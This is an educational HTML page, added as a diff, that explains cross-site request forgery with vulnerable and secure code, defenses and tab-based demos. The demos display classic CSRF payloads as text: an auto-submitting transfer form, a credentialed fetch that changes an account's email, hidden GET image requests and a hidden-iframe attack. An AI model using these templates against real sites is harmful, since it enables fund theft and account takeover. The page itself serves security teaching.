@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Educational demonstration of CSRF attack vectors">
+    <meta name="author" content="Kailas">
+    <meta name="creator" content="Kailas - Security Researcher">
+    <title>CSRF Security Lab - Developed by Kailas</title>
+    <style>
+        :root {
+            --primary-color: #e74c3c;
+            --secondary-color: #2c3e50;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --background-light: #ecf0f1;
+            --text-dark: #2c3e50;
+            --border-color: #bdc3c7;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-dark);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        header {
+            background: var(--secondary-color);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .content-wrapper {
+            padding: 30px;
+        }
+
+        .section {
+            background: var(--background-light);
+            border-left: 4px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 30px;
+            transition: transform 0.3s ease;
+        }
+
+        .section:hover {
+            transform: translateX(5px);
+        }
+
+        .section h2 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section h2::before {
+            content: '⚠️';
+            font-size: 1.5rem;
+        }
+
+        .interactive-demo {
+            background: linear-gradient(135deg, #667eea20 0%, #764ba220 100%);
+            border: 2px solid var(--primary-color);
+        }
+
+        .demo-controls {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        button {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        button:hover {
+            background: #c0392b;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: var(--secondary-color);
+        }
+
+        .btn-secondary:hover {
+            background: #1a252f;
+        }
+
+        .result-display {
+            background: white;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .result-display.active {
+            display: block;
+        }
+
+        .result-display h3 {
+            color: var(--success-color);
+            margin-bottom: 12px;
+        }
+
+        pre {
+            background: var(--secondary-color);
+            color: #2ecc71;
+            padding: 20px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .attack-vector {
+            background: #fff3cd;
+            border-left: 4px solid var(--warning-color);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .attack-vector strong {
+            color: var(--warning-color);
+        }
+
+        ol, ul {
+            margin-left: 25px;
+            margin-top: 15px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        .code-block {
+            background: #282c34;
+            color: #abb2bf;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .code-comment {
+            color: #5c6370;
+            font-style: italic;
+        }
+
+        .mitigation-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .mitigation-item {
+            background: white;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 3px solid var(--success-color);
+        }
+
+        .mitigation-item h4 {
+            color: var(--success-color);
+            margin-bottom: 8px;
+        }
+
+        .warning-banner {
+            background: var(--warning-color);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+            border-radius: 6px;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--text-dark);
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        .tab:hover {
+            background: var(--background-light);
+            transform: none;
+            box-shadow: none;
+        }
+
+        .tab.active {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        footer {
+            background: var(--secondary-color);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+        }
+        
+        footer p {
+            margin: 5px 0;
+        }
+
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 1.8rem;
+            }
+
+            .demo-controls {
+                flex-direction: column;
+            }
+
+            button {
+                width: 100%;
+            }
+
+            .tabs {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="container" role="main">
+        <header role="banner">
+            <h1>🔒 CSRF Security Demonstration Lab</h1>
+            <p>Educational platform for understanding Cross-Site Request Forgery attacks</p>
+            <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 8px; font-weight: 500;">👨‍💻 Developed by Kailas | Security Research Project 2026</p>
+        </header>
+
+        <div class="content-wrapper">
+            <div class="warning-banner">
+                ⚠️ EDUCATIONAL USE ONLY - This demonstration is for learning purposes and performs no actual attacks
+            </div>
+
+            <section class="section interactive-demo" aria-labelledby="interactive-demo-heading">
+                <h2 id="interactive-demo-heading">Interactive Attack Simulation</h2>
+                <p>Experience how CSRF attacks exploit trust relationships between web applications and authenticated users.</p>
+                
+                <nav class="tabs" aria-label="Attack Simulation Tabs">
+                    <button class="tab active" data-tab="basic" aria-controls="basic-tab" aria-selected="true" tabindex="0">Basic Attack</button>
+                    <button class="tab" data-tab="advanced" aria-controls="advanced-tab" aria-selected="false" tabindex="-1">Advanced Scenarios</button>
+                    <button class="tab" data-tab="payload" aria-controls="payload-tab" aria-selected="false" tabindex="-1">Payload Analysis</button>
+                </nav>
+
+                <section class="tab-content active" id="basic-tab" role="tabpanel" aria-labelledby="basic-tab-label">
+                    <div class="demo-controls">
+                        <button id="launchBasicAttack" aria-label="Simulate Basic CSRF Attack">🎯 Simulate Basic CSRF</button>
+                        <button id="demonstrateToken" class="btn-secondary" aria-label="Show Token Protection">🛡️ Show Token Protection</button>
+                        <button id="resetDemo" class="btn-secondary" aria-label="Reset Simulation">🔄 Reset</button>
+                    </div>
+
+                    <div class="result-display" id="basicResult">
+                        <h3>✅ Attack Simulation Complete</h3>
+                        <p><strong>Attack Vector:</strong> Unauthorized state-changing request</p>
+                        <pre id="basicPayload"></pre>
+                        <div class="attack-vector">
+                            <strong>Impact:</strong> <span id="impactDescription"></span>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="tab-content" id="advanced-tab" role="tabpanel" aria-labelledby="advanced-tab-label">
+                    <div class="demo-controls">
+                        <button id="jsonAttack" aria-label="Simulate JSON Endpoint Attack">📡 JSON Endpoint Attack</button>
+                        <button id="getAttack" aria-label="Simulate GET-based Attack">🔗 GET-based Attack</button>
+                        <button id="iframeAttack" aria-label="Simulate Hidden Iframe Attack">🖼️ Hidden Iframe Attack</button>
+                    </div>
+
+                    <div class="result-display" id="advancedResult">
+                        <h3>Advanced Attack Scenario</h3>
+                        <pre id="advancedPayload"></pre>
+                    </div>
+                </section>
+
+                <section class="tab-content" id="payload-tab" role="tabpanel" aria-labelledby="payload-tab-label">
+                    <p>Analyze the structure and components of CSRF attack payloads:</p>
+                    <div class="code-block">
+                        <span class="code-comment">// Malicious HTML hosted on attacker's site</span><br>
+                        &lt;form id="exploit" action="https://vulnerable-app.com/transfer" method="POST"&gt;<br>
+                        &nbsp;&nbsp;&lt;input name="recipient" value="attacker@evil.com"&gt;<br>
+                        &nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;<br>
+                        &lt;/form&gt;<br>
+                        &lt;script&gt;document.getElementById('exploit').submit();&lt;/script&gt;
+                    </div>
+                </section>
+            </div>
+
+            <section class="section" aria-labelledby="csrf-mechanics-heading">
+                <h2 id="csrf-mechanics-heading">Understanding CSRF Mechanics</h2>
+                <p>CSRF attacks exploit the automatic inclusion of authentication credentials (cookies, session tokens) with every browser request to a domain.</p>
+                
+                <ol>
+                    <li><strong>User Authentication:</strong> Victim logs into legitimate website (bank.com)</li>
+                    <li><strong>Session Establishment:</strong> Browser stores authentication cookie</li>
+                    <li><strong>Attacker Trap:</strong> Victim visits malicious site (evil.com)</li>
+                    <li><strong>Cross-Site Request:</strong> Malicious page submits form to bank.com</li>
+                    <li><strong>Automatic Authentication:</strong> Browser includes bank.com cookies</li>
+                    <li><strong>Unauthorized Action:</strong> Bank processes request as legitimate</li>
+                </ol>
+            </section>
+
+            <section class="section" aria-labelledby="vulnerable-code-heading">
+                <h2 id="vulnerable-code-heading">Vulnerable Code Examples</h2>
+                
+                <h3>❌ Vulnerable Implementation</h3>
+                <div class="code-block">
+                    <span class="code-comment">// No CSRF protection</span><br>
+                    app.post('/api/transfer-funds', authenticate, (req, res) => {<br>
+                    &nbsp;&nbsp;const { recipient, amount } = req.body;<br>
+                    &nbsp;&nbsp;transferMoney(req.user.id, recipient, amount);<br>
+                    &nbsp;&nbsp;res.json({ success: true });<br>
+                    });
+                </div>
+
+                <h3>✅ Secure Implementation</h3>
+                <div class="code-block">
+                    <span class="code-comment">// With CSRF token validation</span><br>
+                    app.post('/api/transfer-funds', [authenticate, csrfProtection], (req, res) => {<br>
+                    &nbsp;&nbsp;const { recipient, amount, _csrf } = req.body;<br>
+                    &nbsp;&nbsp;if (!validateCsrfToken(req.session.csrfSecret, _csrf)) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;return res.status(403).json({ error: 'Invalid CSRF token' });<br>
+                    &nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;transferMoney(req.user.id, recipient, amount);<br>
+                    &nbsp;&nbsp;res.json({ success: true });<br>
+                    });
+                </div>
+            </section>
+
+            <section class="section" aria-labelledby="defense-mechanisms-heading">
+                <h2 id="defense-mechanisms-heading">Defense Mechanisms</h2>
+                <div class="mitigation-list">
+                    <div class="mitigation-item">
+                        <h4>🎫 Synchronizer Tokens</h4>
+                        <p>Server generates unique token per session, validated on submission</p>
+                    </div>
+                    <div class="mitigation-item">
+                        <h4>🍪 SameSite Cookies</h4>
+                        <p>Restrict cookie transmission to same-site requests only</p>
+                    </div>
+                    <div class="mitigation-item">
+                        <h4>🔍 Origin Validation</h4>
+                        <p>Verify Origin/Referer headers match expected domain</p>
+                    </div>
+                    <div class="mitigation-item">
+                        <h4>🔐 Double Submit</h4>
+                        <p>Token in both cookie and request parameter must match</p>
+                    </div>
+                    <div class="mitigation-item">
+                        <h4>📋 Custom Headers</h4>
+                        <p>Require custom headers that CSRF cannot forge</p>
+                    </div>
+                    <div class="mitigation-item">
+                        <h4>🔑 Re-authentication</h4>
+                        <p>Require password confirmation for sensitive operations</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section" aria-labelledby="implementation-guide-heading">
+                <h2 id="implementation-guide-heading">Implementation Guide</h2>
+                
+                <h3>1. SameSite Cookie Configuration</h3>
+                <div class="code-block">
+                    Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
+                </div>
+
+                <h3>2. Token Generation (Server)</h3>
+                <div class="code-block">
+                    const crypto = require('crypto');<br>
+                    const csrfToken = crypto.randomBytes(32).toString('hex');<br>
+                    req.session.csrfToken = csrfToken;<br>
+                    res.render('form', { csrfToken });
+                </div>
+
+                <h3>3. Token Validation (Client)</h3>
+                <div class="code-block">
+                    &lt;input type="hidden" name="_csrf" value="{{ csrfToken }}"&gt;
+                </div>
+            </section>
+        </div>
+
+        <footer role="contentinfo">
+            <p>🎓 Educational Resource | Use responsibly and ethically</p>
+            <p>© 2026 Kailas | Security Research & Education Project</p>
+            <p style="font-size: 0.85rem; margin-top: 10px; opacity: 0.8;">Created for cybersecurity education and authorized testing only</p>
+        </footer>
+    </main>
+
+    <script>
+        // Tab management
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabName = tab.dataset.tab;
+                
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                document.getElementById(`${tabName}-tab`).classList.add('active');
+            });
+        });
+
+        // Basic CSRF attack simulation
+        document.getElementById('launchBasicAttack').addEventListener('click', () => {
+            const targetEndpoint = 'https://vulnerable-bank.example/api/transfer';
+            const payload = {
+                method: 'POST',
+                endpoint: targetEndpoint,
+                body: {
+                    recipient: 'attacker@malicious.com',
+                    amount: '5000',
+                    currency: 'USD'
+                },
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                cookies: 'sessionId=victim_session_token; authenticated=true'
+            };
+
+            const payloadDisplay = `POST ${payload.endpoint}
+Content-Type: ${payload.headers['Content-Type']}
+Cookie: ${payload.cookies}
+
+Body Parameters:
+${JSON.stringify(payload.body, null, 2)}`;
+
+            document.getElementById('basicPayload').textContent = payloadDisplay;
+            document.getElementById('impactDescription').textContent = 
+                'Without CSRF protection, this request would transfer $5,000 to the attacker using the victim\'s authenticated session.';
+            document.getElementById('basicResult').classList.add('active');
+        });
+
+        // Token protection demonstration
+        document.getElementById('demonstrateToken').addEventListener('click', () => {
+            const protectedPayload = `POST https://secure-bank.example/api/transfer
+Content-Type: application/json
+Cookie: sessionId=victim_session; authenticated=true
+X-CSRF-Token: a7f9c3e1b4d2f8e6c9a1b3d5e7f9c1a3
+
+{
+  "recipient": "attacker@malicious.com",
+  "amount": "5000",
+  "currency": "USD",
+  "_csrf": "a7f9c3e1b4d2f8e6c9a1b3d5e7f9c1a3"
+}
+
+Server Response: 403 Forbidden
+{
+  "error": "CSRF token validation failed",
+  "message": "Token mismatch or missing"
+}`;
+
+            document.getElementById('basicPayload').textContent = protectedPayload;
+            document.getElementById('impactDescription').textContent = 
+                'With proper CSRF protection, the server validates the token and rejects unauthorized requests.';
+            document.getElementById('basicResult').classList.add('active');
+        });
+
+        // JSON endpoint attack
+        document.getElementById('jsonAttack').addEventListener('click', () => {
+            const jsonPayload = `// Attacker's malicious JavaScript
+fetch('https://api.vulnerable.com/user/settings', {
+  method: 'POST',
+  credentials: 'include', // Sends cookies
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    email: 'attacker@evil.com',
+    notifications: false
+  })
+}).then(r => console.log('Settings hijacked'));
+
+// Note: Modern browsers block this via CORS
+// But older APIs or misconfigured CORS allow it`;
+
+            document.getElementById('advancedPayload').textContent = jsonPayload;
+            document.getElementById('advancedResult').classList.add('active');
+        });
+
+        // GET-based attack
+        document.getElementById('getAttack').addEventListener('click', () => {
+            const getPayload = `<!-- Attacker embeds malicious image tag -->
+<img src="https://vulnerable.com/api/delete-account?confirm=true" 
+     style="display:none">
+
+<!-- Or link disguised as legitimate content -->
+<a href="https://vulnerable.com/transfer?to=attacker&amount=1000">
+  Click here for free prize!
+</a>
+
+Risk: GET requests should NEVER perform state-changing operations`;
+
+            document.getElementById('advancedPayload').textContent = getPayload;
+            document.getElementById('advancedResult').classList.add('active');
+        });
+
+        // Iframe attack
+        document.getElementById('iframeAttack').addEventListener('click', () => {
+            const iframePayload = `<!-- Hidden iframe attack -->
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id="exploit" action="https://vulnerable.com/api/action" 
+      method="POST" target="csrf-frame">
+  <input name="malicious" value="payload">
+</form>
+<script>
+  // Auto-submit when victim visits attacker's page
+  document.getElementById('exploit').submit();
+  
+  // Victim never sees the attack happen
+  setTimeout(() => window.location = 'http://legitimate-site.com', 100);
+<\/script>`;
+
+            document.getElementById('advancedPayload').textContent = iframePayload;
+            document.getElementById('advancedResult').classList.add('active');
+        });
+
+        // Reset demo
+        document.getElementById('resetDemo').addEventListener('click', () => {
+            document.querySelectorAll('.result-display').forEach(display => {
+                display.classList.remove('active');
+            });
+        });
+
+        // Console welcome message
+        console.log('%c🔐 CSRF Security Lab', 'font-size: 20px; color: #e74c3c; font-weight: bold;');
+        console.log('%c👨‍💻 Developed by: Kailas', 'font-size: 14px; color: #9b59b6; font-weight: bold;');
+        console.log('%c🎯 Security Research Project 2026', 'color: #3498db; font-weight: 600;');
+        console.log('%cEducational demonstration environment', 'color: #2c3e50;');
+        console.log('%cNo actual attacks are performed', 'color: #27ae60;');
+    </script>
+</body>
+</html>
